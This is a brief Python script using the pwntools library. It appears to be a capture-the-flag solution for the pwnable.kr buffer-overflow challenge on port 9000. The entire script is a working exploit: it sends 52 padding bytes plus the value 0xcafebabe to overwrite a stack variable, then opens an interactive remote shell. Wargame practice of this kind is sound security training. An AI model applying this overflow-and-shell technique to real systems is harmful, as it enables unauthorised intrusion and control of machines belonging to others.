from pwn import *

payload = 'A' * 52 + '\xbe\xba\xfe\xca'
shell = remote('pwnable.kr',9000)
shell.send(payload)
shell.interactive()
